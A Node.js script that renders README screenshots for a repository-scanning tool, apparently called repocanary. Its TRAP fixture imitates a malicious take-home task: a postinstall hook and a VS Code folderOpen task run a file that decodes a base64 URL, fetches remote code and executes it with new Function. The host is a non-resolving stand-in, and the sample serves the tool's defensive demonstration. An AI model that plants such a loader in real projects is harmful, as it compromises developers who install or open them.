#!/usr/bin/env node
/**
 * The README's screenshots, regenerated from the real engine and site.
 *
 *   npm run build:web && npm run start:web &
 *   npm i --no-save playwright-core sharp @fontsource-variable/inter @fontsource-variable/jetbrains-mono
 *   SITE_URL=http://localhost:3000 npm run screenshots   # writes docs/screenshots/
 *
 * Nothing in a screenshot is drawn by hand. The two repositories below are
 * scanned offline by the same scanRepo the CLI runs, the terminal shows that
 * scan's renderHuman output byte for byte, and the web shots are the running
 * site with /api/scan answered from the same result (a real scan would need
 * GitHub and a token). Only the frames around them are drawn: a window, a
 * terminal, a phone.
 *
 * Inter and JetBrains Mono stand in for the system fonts a visitor's own
 * machine would use, so a shot taken on a bare Linux runner does not look
 * like one. sharp, when present, reduces each image to a palette: a quarter
 * of the bytes, in a repository the GitHub Action ships whole to every
 * consumer.
 *
 * Environment: SITE_URL (default http://localhost:3000) and CHROMIUM_PATH
 * (default: the browser playwright-core finds).
 */

import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { createRequire } from "node:module";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { makeClient } from "../test/helpers.js";
import { scanRepo } from "../src/scan.js";
import { renderHuman } from "../src/report.js";
import { DISCLAIMER, headline, whatItDoes, whatToDo } from "../web/lib/present.ts";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const OUT = join(ROOT, "docs", "screenshots");
const SITE = process.env.SITE_URL ?? "http://localhost:3000";
const require = createRequire(import.meta.url);
const { chromium } = require("playwright-core");
const fontFile = (pkg, file) => readFileSync(require.resolve(`@fontsource-variable/${pkg}/files/${file}`));
const INTER = fontFile("inter", "inter-latin-wght-normal.woff2");
const MONO = fontFile("jetbrains-mono", "jetbrains-mono-latin-wght-normal.woff2");

// A take-home task of the kind the campaigns send: a postinstall loader that
// fetches its second stage, and a VS Code task that runs it on folder open.
// The loader's address is under .invalid, so it resolves nowhere.
const TRAP = {
  files: {
    "package.json": JSON.stringify(
      {
        name: "trade-dashboard",
        version: "1.0.0",
        private: true,
        scripts: { dev: "next dev", build: "next build", start: "next start", postinstall: "node server/config/initDatabase.js" },
        dependencies: { next: "^15.3.0", react: "^19.0.0", "react-dom": "^19.0.0", axios: "^1.7.0", mongoose: "^8.4.0" },
      },
      null,
      2,
    ),
    "README.md": "# Trade Dashboard\n\nTake-home task. Please run `npm install && npm run dev`, then fix the chart bug on /portfolio.\n",
    "server/config/initDatabase.js": [
      "const axios = require('axios');",
      "const mongoose = require('mongoose');",
      "",
      "async function initDatabase() {",
      "  const src = Buffer.from('aHR0cHM6Ly9jb25maWctc3luYy5leGFtcGxlLmludmFsaWQvdjEvaW5pdA==', 'base64').toString();",
      "  const { data } = await axios.get(src);",
      "  new Function('require', data)(require);",
      "  await mongoose.connect(process.env.MONGO_URL || 'mongodb://localhost/trade');",
      "}",
      "",
      "initDatabase();",
    ].join("\n"),
    ".vscode/tasks.json": JSON.stringify(
      { version: "2.0.0", tasks: [{ label: "prepare", type: "shell", command: "node server/config/initDatabase.js", runOptions: { runOn: "folderOpen" } }] },
      null,
      2,
    ),
    "app/page.tsx": "export default function Page() {\n  return <main>Portfolio</main>;\n}\n",
    "app/portfolio/page.tsx": "export default function Portfolio() {\n  return <section>Chart</section>;\n}\n",
  },
  meta: {
    owner: "some-recruiter",
    repo: "take-home-task",
    description: "Trade dashboard take-home",
    ownerCreatedAt: "2026-08-30T00:00:00Z",
    createdAt: "2026-09-02T00:00:00Z",
    commitDates: ["2026-09-02T09:00:00Z"],
    commitAuthorNames: ["dev"],
    ownerPublicRepos: 2,
  },
};
const CLEAN = {
  files: {
    "package.json": JSON.stringify(
      { name: "widget-api", version: "2.4.1", scripts: { start: "node server.js", test: "node --test" }, dependencies: { express: "^4.21.0", zod: "^3.23.0" } },
      null,
      2,
    ),
    "server.js": "import express from 'express';\nconst app = express();\napp.get('/health', (req, res) => res.json({ ok: true }));\napp.listen(3000);\n",
    "README.md": "# widget-api\n\nA small HTTP API. `npm start` runs it on port 3000.\n",
  },
  meta: { owner: "acme", repo: "widget-api", description: "A small HTTP API" },
};

const NOW = Date.parse("2026-09-20T00:00:00Z");
const scanOf = ({ files, meta }) => scanRepo({ owner: meta.owner, repo: meta.repo, client: makeClient(files, { meta }), now: NOW });

/** The body /api/scan returns for a scan, built the way the route builds it. */
function apiBody(scan) {
  const s = scan.stats.severities;
  return JSON.stringify({
    verdict: scan.verdict,
    headline: headline(scan.verdict, scan.meta.owner, scan.meta.repo),
    whatItDoes: whatItDoes(scan.verdict, scan.findings),
    findings: scan.findings,
    whatToDo: whatToDo(scan.verdict),
    notes: scan.notes,
    disclaimer: DISCLAIMER,
    repo: { owner: scan.meta.owner, repo: scan.meta.repo, ref: scan.meta.ref },
    stats: { filesScanned: scan.stats.filesScanned, findings: scan.stats.findings, high: s.high, medium: s.medium, low: s.low, aiValidated: false, aiModel: null },
  });
}

const red = await scanOf(TRAP);
const green = await scanOf(CLEAN);
const bodies = { red: apiBody(red), green: apiBody(green) };

const browser = await chromium.launch({ executablePath: process.env.CHROMIUM_PATH });
const FONT_CSS = `
@font-face { font-family: "ShotSans"; src: url(/__shot/sans.woff2) format("woff2"); font-weight: 100 900; }
@font-face { font-family: "ShotMono"; src: url(/__shot/mono.woff2) format("woff2"); font-weight: 100 900; }
html { scroll-behavior: auto !important; }
html, body, button, input, select, textarea { font-family: "ShotSans", sans-serif !important; }
code, pre, kbd, samp, .font-mono { font-family: "ShotMono", monospace !important; }`;

/** A page of the running site, with fonts and /api/scan answered locally. */
async function sitePage(viewport, scale, verdict) {
  const page = await browser.newPage({ viewport, deviceScaleFactor: scale, colorScheme: "dark", reducedMotion: "reduce" });
  await page.route("**/__shot/*", (r) =>
    r.fulfill({ body: r.request().url().endsWith("sans.woff2") ? INTER : MONO, contentType: "font/woff2" }),
  );
  await page.route("**/api/scan", (r) => r.fulfill({ body: bodies[verdict], contentType: "application/json" }));
  return page;
}
async function settle(page) {
  // The form is inert until React hydrates it; a value typed before that is
  // thrown away and the button stays disabled.
  await page.waitForLoadState("networkidle");
  await page.addStyleTag({ content: FONT_CSS });
  await page.evaluate(() => document.fonts.ready);
  await page.waitForTimeout(200);
}
async function submit(page, repo) {
  await page.fill('input[aria-label="GitHub repository URL"]', `https://github.com/${repo}`);
  await page.waitForSelector('button[type="submit"]:not([disabled])');
  await page.click('button[type="submit"]');
  await page.waitForSelector("text=What to do now");
  await page.waitForTimeout(1000);
}
async function scrollToHeading(page, text, offset) {
  await page.evaluate(
    ({ text, offset }) => {
      const el = [...document.querySelectorAll("h2,h3")].find((e) => e.textContent.trim().toLowerCase().startsWith(text.toLowerCase()));
      window.scrollTo(0, el.getBoundingClientRect().top + window.scrollY - offset);
    },
    { text, offset },
  );
  await page.waitForTimeout(150);
}

// Raw captures. Desktop is 1024 CSS px wide rendered to 1600 px, the width of
// the frame; phones are 390 px at 2x under a drawn status bar.
const raw = {};
const grab = async (page, key) => {
  raw[key] = `data:image/png;base64,${(await page.screenshot()).toString("base64")}`;
};
const DESKTOP = { width: 1024, height: 695 };
const D_SCALE = 1600 / 1024;

let page = await sitePage(DESKTOP, D_SCALE, "red");
await page.goto(`${SITE}/`);
await settle(page);
await grab(page, "desktop-home");
await submit(page, "some-recruiter/take-home-task");
await scrollToHeading(page, "Danger:", 110);
await grab(page, "desktop-red");
await page.close();

page = await sitePage(DESKTOP, D_SCALE, "green");
await page.goto(`${SITE}/`);
await settle(page);
await submit(page, "acme/widget-api");
await scrollToHeading(page, "Nothing known matched", 110);
await grab(page, "desktop-green");
await page.close();

page = await sitePage(DESKTOP, D_SCALE, "red");
await page.goto(`${SITE}/coverage`);
await settle(page);
await grab(page, "desktop-coverage");
await page.close();

page = await sitePage({ width: 390, height: 797 }, 2, "red");
await page.goto(`${SITE}/`);
await settle(page);
await grab(page, "phone-home");
await submit(page, "some-recruiter/take-home-task");
await scrollToHeading(page, "Danger:", 90);
await grab(page, "phone-red");
await scrollToHeading(page, "What we found", 16);
await grab(page, "phone-findings");
await scrollToHeading(page, "What to do now", 16);
await grab(page, "phone-todo");
await page.close();

// Frames.
const b64font = (buf) => `data:font/woff2;base64,${buf.toString("base64")}`;
const FRAME_FONTS = `@font-face{font-family:Sans;src:url(${b64font(INTER)});font-weight:100 900}
@font-face{font-family:Mono;src:url(${b64font(MONO)});font-weight:100 900}`;
// Light and dark describe the frame, matching the reader's GitHub theme. The
// site itself is dark in both, because it is dark.
const THEMES = {
  dark: { bar: "#1c1c1f", line: "#2e2e33", border: "#3a3a40", term: "#0c0c0d", text: "#e4e4e7", dim: "#8b8b94", prompt: "#f8ba32" },
  light: { bar: "#f4f4f5", line: "#e4e4e7", border: "#d4d4d8", term: "#ffffff", text: "#1f1f23", dim: "#6b6b74", prompt: "#b7791f" },
};
const esc = (s) => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
const windowFrame = (t, { title = "", body, background }) => `<!doctype html><style>${FRAME_FONTS}
html,body{margin:0;background:transparent}
.win{width:1600px;height:1130px;border-radius:14px;overflow:hidden;border:1px solid ${t.border};box-sizing:border-box;background:${background};display:flex;flex-direction:column}
.bar{height:44px;flex:none;background:${t.bar};border-bottom:1px solid ${t.line};display:flex;align-items:center;gap:8px;padding-left:18px;position:relative;font:500 15px Sans;color:${t.dim}}
.dot{width:12px;height:12px;border-radius:50%}
.title{position:absolute;left:0;right:0;text-align:center}
.body{flex:1;overflow:hidden}
.body img{display:block;width:100%}
pre{margin:0;padding:34px 44px;font:400 23px/1.52 Mono;color:${t.text};white-space:pre}
.p{color:${t.prompt}} .c{font-weight:600}
</style><div class="win"><div class="bar"><span class="dot" style="background:#ff5f57"></span><span class="dot" style="background:#febc2e"></span><span class="dot" style="background:#28c840"></span><span class="title">${title}</span></div><div class="body">${body}</div></div>`;

const STATUS_ICONS = `<svg width="18" height="12" viewBox="0 0 18 12"><rect x="0" y="8" width="3" height="4" rx="1" fill="#fff"/><rect x="5" y="5.5" width="3" height="6.5" rx="1" fill="#fff"/><rect x="10" y="3" width="3" height="9" rx="1" fill="#fff"/><rect x="15" y="0" width="3" height="12" rx="1" fill="#fff"/></svg>
<svg width="16" height="12" viewBox="0 0 16 12"><path d="M8 11.5 5.6 9a3.4 3.4 0 0 1 4.8 0L8 11.5Zm-4.2-4.3L2.3 5.7a8 8 0 0 1 11.4 0l-1.5 1.5a5.9 5.9 0 0 0-8.4 0ZM.6 4 0 3.4a11.3 11.3 0 0 1 16 0l-.6.6-.9.9a10 10 0 0 0-13 0L.6 4Z" fill="#fff"/></svg>
<svg width="27" height="13" viewBox="0 0 27 13"><rect x=".5" y=".5" width="23" height="12" rx="3.5" stroke="#fff" opacity=".5" fill="none"/><rect x="2" y="2" width="20" height="9" rx="2" fill="#fff"/><rect x="25" y="4.5" width="1.5" height="4" rx=".75" fill="#fff" opacity=".5"/></svg>`;
const phone = (key) =>
  `<div class="phone"><div class="screen"><div class="status"><span>9:41</span><span class="icons">${STATUS_ICONS}</span></div><div class="island"></div><img src="${raw[key]}"><div class="home"></div></div></div>`;
const phonesFrame = `<!doctype html><style>${FRAME_FONTS}
html,body{margin:0;background:transparent}
.row{width:1800px;height:910px;display:flex;justify-content:space-between;align-items:center;padding:0 24px;box-sizing:border-box}
.phone{width:410px;height:862px;border-radius:66px;background:#1d1d20;padding:12px;box-sizing:border-box;box-shadow:0 0 0 2px #3a3a3f inset,0 24px 50px rgba(0,0,0,.28)}
.screen{position:relative;width:386px;height:838px;border-radius:54px;overflow:hidden;background:#0c0c0d}
.status{height:52px;display:flex;justify-content:space-between;align-items:center;padding:6px 30px 0 44px;box-sizing:border-box;font:600 17px Sans;color:#fff}
.icons{display:flex;gap:6px;align-items:center}
.island{position:absolute;top:11px;left:50%;width:118px;height:34px;margin-left:-59px;border-radius:20px;background:#000}
.screen img{display:block;width:386px}
.home{position:absolute;bottom:9px;left:50%;width:134px;height:5px;margin-left:-67px;border-radius:3px;background:#fff;opacity:.85}
</style><div class="row">${["phone-home", "phone-red", "phone-findings", "phone-todo"].map(phone).join("")}</div>`;

mkdirSync(OUT, { recursive: true });
async function compress(png) {
  try {
    const sharp = require("sharp");
    return await sharp(png).png({ palette: true, quality: 92, effort: 10, compressionLevel: 9 }).toBuffer();
  } catch {
    return png;
  }
}
async function render(html, file, width, height) {
  const p = await browser.newPage({ viewport: { width, height } });
  await p.setContent(html);
  await p.evaluate(() => document.fonts.ready);
  await p.waitForTimeout(200);
  writeFileSync(join(OUT, file), await compress(await p.screenshot({ omitBackground: true })));
  await p.close();
}

for (const [mode, t] of Object.entries(THEMES)) {
  for (const name of ["home", "red", "green", "coverage"]) {
    await render(windowFrame(t, { body: `<img src="${raw[`desktop-${name}`]}">`, background: "#0c0c0d" }), `web-${name}-${mode}.png`, 1600, 1130);
  }
  for (const [name, scan] of [["red", red], ["green", green]]) {
    const target = `${scan.meta.owner}/${scan.meta.repo}`;
    const code = { green: 0, yellow: 1, red: 2 }[scan.verdict];
    const text = `<span class="p">~ $</span> <span class="c">npx repocanary ${target}</span>\n${esc(renderHuman(scan).trimEnd())}\n<span class="p">~ $</span> <span class="c">echo $?</span>\n${code}`;
    await render(windowFrame(t, { title: "Terminal", body: `<pre>${text}</pre>`, background: t.term }), `cli-${name}-${mode}.png`, 1600, 1130);
  }
}
await render(phonesFrame, "phones.png", 1800, 910);
await browser.close();
console.log(`Wrote ${OUT}`);
